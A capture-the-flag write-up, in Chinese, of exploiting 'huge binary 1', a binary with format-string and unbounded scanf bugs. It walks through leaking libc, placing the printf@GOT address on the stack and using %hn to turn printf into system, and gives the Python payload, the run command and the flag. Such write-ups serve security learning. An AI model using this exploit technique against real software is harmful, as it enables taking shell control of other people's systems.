# huge binary 1 — `K17{it's_ab0v3_aver@ge_actua1ly}`

## 三個原語

```c
scanf("%d", &idx);
printf("Your lucky number is 0x%llx\n", *(long *)(rbp + idx*8 - 8));  // 任意堆疊讀
scanf("%s", rbp-0x90);    // 無長度限制
scanf("%s", rbp-0x110);   // 無長度限制
puts("Echoed output: ");
printf(rbp-0x90);         // 格式字串
printf(rbp-0x110);        // 格式字串
```

Non-PIE、無 canary、Partial RELRO。remote 是 Debian 13 的 **glibc 2.41**。

## 為什麼不能直接 ret2libc

`scanf("%s")` **寫不出 NUL byte**，而 x86-64 的 libc 位址是
`0x0000_7fxx_xxxx_xxxx`——高 2 個 byte 必須是 0。

一整串連續寫入只會在結尾補**一個** NUL，所以整個 payload 裡只放得下**一個** 6-byte 位址
（第 6 個 byte 由終止符補上，第 7 個 byte 本來就是 0）。三段式的
`pop rdi; /bin/sh; system` 需要 6 個 NUL，做不到。

那就只剩 one_gadget——但 **glibc 2.41 沒有可用的**：`system()` 改走 `posix_spawn`，
而 libc 裡 6 個 `execve` 呼叫點全部都要求事先備妥暫存器：

```
ddf2d:  mov rdx,r13 ; mov rsi,r12 ; mov rdi,r14 ; call execve   <- r12/r13/r14 都要先擺好
```

（也不能寄望 `ret` 當下 rdi 還指著 buf2——rdi 是 caller-saved，`printf` 回來後內容不保證。）

## 正解：用格式字串把 `printf@GOT` 蓋成 `system`

`%n` 會**幫我們把 NUL 寫出來**，繞過上面整個限制。而且 binary 是 non-PIE：

```
$ objdump -R chal
0000000000403390 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
```

於是：

- `printf(buf1)` 把 `printf@GOT` 改成 `system`
- `printf(buf2)` 就直接變成 `system(buf2)`，**rdi 由 call 本身正確設好**

## 堆疊位移（對實機量測）

`printf` 呼叫時 `rsp = rbp-0x120`，所以 `%6$ = [rbp-0x120]`，之後每 +1 就是 +8：

| 位置 | 索引 | 實測 |
|---|---|---|
| `[rbp-0x120]` (argv) | `%6$` | `0x7ffd823af138` |
| buf2 (`rbp-0x110`) | `%8$` | `0x4242424242424242` |
| buf1 (`rbp-0x90`) | `%24$` | `0x4141414141414141` |
| buf1+0x18 | `%27$` | — |

## 怎麼把 `0x403390` 這個指標放上堆疊

它有 5 個 0 byte，一樣寫不出來。但**只要那個 qword 的高 5 個 byte 本來就是 0** 就行。
用讀取原語掃一遍 buf1 區域（`rbp-0x90+K` 對應 `idx = (K-0x88)/8`）：

```
buf1+0x10  idx=-15  ->  0x40
buf1+0x18  idx=-14  ->  0x10          <-- bytes 3..7 全為 0
buf1+0x20  idx=-13  ->  0x8000
buf1+0x28  idx=-12  ->  0x218c0b1900000000
```

`buf1+0x18` 正好。寫入 `90 33 40` 三個 byte，`scanf` 的終止符落在 byte 3，
整個 qword 就成為 `0x0000000000403390`。

## Payload

```python
buf1 = b"%%1$%dc%%27$hn" % n          # n = (base + 0x53110) & 0xffff
buf1 = buf1.ljust(0x18, b"A") + b"\x90\x33\x40"
buf2 = b"/bin/sh"
```

`idx=2` 讀到 `[rbp+8]` 也就是 main 的回傳位址 = `libc+0x29ca8`，據此算出 libc base。

單一個 `%hn` 只改低 2 個 byte，所以需要 `printf` 與 `system` 在 bit 16 以上相同：

```python
if (base + 0x59900) >> 16 != (base + 0x53110) >> 16:
    reconnect()       # 換一個 ASLR base
```

`0x53110 - 0x59900 = -0x67f0`，當 libc base 的低 16 bits 落在 `[0x7000, 0xcfff]`
時兩者進位不同、需要動到第 3 個 byte，這種 base 直接重連換掉即可（約六成的連線可用）。

```bash
HB1_HOST=chal.secso.cc HB1_PORT=4002 python3 challenges/huge-binary-easy/solve.py
```

```
[1] base=0x7fa79ea5d000 system=0x7fa79eab0110
[+] FLAG: K17{it's_ab0v3_aver@ge_actua1ly}
```
